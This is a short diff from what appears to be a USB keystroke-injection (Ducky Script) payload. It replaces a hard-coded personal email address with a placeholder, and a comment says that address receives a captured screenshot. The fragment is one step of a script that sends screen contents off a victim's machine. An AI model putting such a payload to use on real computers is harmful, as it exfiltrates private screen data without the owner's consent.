@@ -95,7 +95,7 @@ TAB
 TAB
 ENTER
 DELAY 5000
-STRING bryce.slabaugh@gmail.com
+STRING "EMAIL GOES HERE WITHOUT QUOTES"
 REM ^^^ This is the email that will recieve the screenshot ^^^
 ENTER
 DELAY 1000
